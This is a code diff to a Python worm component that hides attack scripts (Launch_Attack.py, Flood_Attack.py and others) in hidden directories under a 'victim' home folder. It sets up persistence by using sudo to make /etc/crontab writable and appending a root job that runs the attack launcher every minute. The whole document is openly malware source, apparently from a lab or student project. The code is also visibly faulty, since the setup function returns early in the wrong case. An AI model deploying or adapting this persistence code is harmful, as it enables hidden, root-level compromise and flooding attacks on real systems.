@@ -1,13 +1,16 @@
 import os
-from crontab import CronTab
 
 attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
+etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py'
+varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
 
 
 def check_attack():
-    if not is_infect():
+    if not is_set_up_attack():
         set_up_attack()
+
+    if not is_set_up_crontab():
         set_up_crontab()
 
 
@@ -23,38 +26,42 @@ def set_up_attack():
 
 
 def set_up_crontab():
-    cron = CronTab(user=True)
+    if not is_set_up_crontab():
+        return
 
-    if not cron.find_comment('etc worm attack'):
-        job1 = cron.new(command='sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py',
-                        comment='etc worm attack')
-        job1.setall('*/1 * * * *')
+    # Write Crontab
+    os.system('sudo chmod +w /etc/crontab')
 
-    if not cron.find_comment('var worm attack'):
-        job2 = cron.new(command='sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py',
-                        comment='var worm attack')
-        job2.setall('*/1 * * * *')
+    crontab = open('/etc/crontab', 'a')
 
-    cron.write()
-
-    return
+    crontab.write(etcAttackCommand)
+    crontab.close()
 
 
-def is_infect():
+def is_set_up_attack():
     for attackDir in attackDirs:
         for attackFile in attackFiles:
-            if not os.path.isfile(attackDir+attackFile):
+            if not os.path.isfile(attackDir + attackFile):
                 return False
 
-    cron = CronTab(user=True)
-
-    if not cron.find_comment('etc worm attack'):
-        return False
-
-    if not cron.find_comment('var worm attack'):
-        return False
-
     return True
+
+
+def is_set_up_crontab():
+    # Read Crontab
+    os.system('sudo chmod +r /etc/crontab')
+
+    crontab = open('/etc/crontab', 'r')
+
+    result = False
+
+    for line in crontab:
+        if line.find(etcAttackCommand) > -1 or line.find(varAttackCommand) > -1:
+            result = True
+
+    crontab.close()
+
+    return result
 
 
 if __name__ == '__main__':
